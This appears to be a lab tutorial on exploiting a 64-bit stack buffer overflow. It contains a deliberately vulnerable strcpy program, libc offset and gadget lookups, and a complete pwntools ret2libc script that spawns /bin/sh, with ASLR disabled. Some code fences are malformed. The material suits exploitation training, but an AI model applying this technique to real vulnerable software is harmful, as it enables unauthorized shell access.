
# 64-bit Exploit Explanation

This exercise illustrates how exploitation is performed in a 64-bit environment.
Important: ASLR will be disabled. In the format string exercise (the challenge), ASLR will be enabled and we will see how to bypass it.

## Source Code

The source code is:

```c
#include<stdio.h> 
#include<string.h> 

void vuln(char *cadena)
{ 
  char buf[100]; 
  strcpy(buf,cadena); 
  printf("Input was: %s\n",buf); 
}
void main(int argc, char *argv[]) 
{
  vuln(argv[1]);
}
```




#### Vulnerability Analysis

The vulnerability is a typical buffer overflow. We need to find the offset. The offset is 120 bytes.



#### Searching for Addresses in libc

We need to find the addresses to execute `system ("/bin/sh")`. Since our executable does not contain the call, we inspect libc:

```
# ldd vuln
        linux-vdso.so.1 (0x00007ffff7ffd000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7e14000)
        /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)

```bash
# objdump -M intel -d /lib/x86_64-linux-gnu/libc.so.6 > dump  # Dump the disassembly (Intel format) into the file dump

# strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh  # Search for /bin/sh and find it at offset 0x183cee
```
 183cee /bin/sh
 
# cat dump | grep system
0000000000046ff0 <__libc_system@@GLIBC_PRIVATE>:
   46ff3:       74 0b                   je     47000 <__libc_system@@GLIBC_PRIVATE+0x10>
0000000000129b50 <svcerr_systemerr@@GLIBC_2.2.5>:
  129ba7:       75 05                   jne    129bae <svcerr_systemerr@@GLIBC_2.2.5+0x5e> 

```

We note the following offsets:

`system:  0x46ff0`

`/bin/sh: 0x183cee`

Now we add these offsets to the base address where LIBC is loaded (we check it with gdb, since it will not change because ASLR is disabled):

```
root@kali:~/bufferOverflow/stackOverflow/x64# gdb -q vuln
Reading symbols from vuln...done.
gdb-peda$ b main 
Breakpoint 1 at 0x1154: file vuln.c, line 7.
gdb-peda$ run
gdb-peda$ vmmap
Start              End                Perm      Name
0x0000555555554000 0x0000555555555000 r--p      vuln
0x0000555555555000 0x0000555555556000 r-xp      vuln
0x0000555555556000 0x0000555555557000 r--p      vuln
0x0000555555557000 0x0000555555558000 r--p      vuln
0x0000555555558000 0x0000555555559000 rw-p      vuln
0x00007ffff7def000 0x00007ffff7e14000 r--p      /lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7e14000 0x00007ffff7f5b000 r-xp      /lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f5b000 0x00007ffff7fa4000 r--p      /lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fa4000 0x00007ffff7fa5000 ---p      /lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fa5000 0x00007ffff7fa8000 r--p      /lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fa8000 0x00007ffff7fab000 rw-p      /lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fab000 0x00007ffff7fb1000 rw-p      mapped
0x00007ffff7fd0000 0x00007ffff7fd3000 r--p      [vvar]
0x00007ffff7fd3000 0x00007ffff7fd5000 r-xp      [vdso]
0x00007ffff7fd5000 0x00007ffff7fd6000 r--p      /lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd6000 0x00007ffff7ff4000 r-xp      /lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 r--p      /lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]

```


Libc load address:

`libc_base = 0x00007ffff7def000`

### Finding a Gadget

Finally, we need to find a gadget to load the appropriate parameter into RDI for calling `system`.

Let's install rop-tool. To do this (it's in the install script in the repository):

```
# apt-get install libcapstone-dev
# cd
# git clone https://github.com/t00sh/rop-tool.git
# cd rop-tool; make; export PATH=$PATH:/root/rop-tool
```

Now we search for gadgets that are useful for loading the value of `/bin/sh` into RDI:

```
# rop-tool gadget libc.so.6 > gadgets
# cat gadgets | grep rdi
 0x000000000002658e -> pop rdi; ret ;
 ...
```

Therefore, we have the offset of the gadget we are looking for:

`offset_pop_rdi = 0x2658e`

### Exploit Development

```python
#!/usr/bin/python
# coding: utf-8

from pwn import *
```python
# Definition of addresses (see above)
libc_base = 0x00007ffff7def000
system_addr = libc_base + 0x46ff0
binsh_addr = libc_base + 0x183cee
pop_rdi = libc_base + 0x2658e

log.info("system: " + str(hex(system_addr)))
log.info("binsh: " + str(hex(binsh_addr)))
log.info("pop_rdi: " + str(hex(pop_rdi)))
pause()

p = process("./vuln")

# Creating the payload (ROP technique)
payload = b""
payload += b"A" * 120
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

# Sending the payload
p.sendline(payload)
```
p.recv()
p.interactive()
```

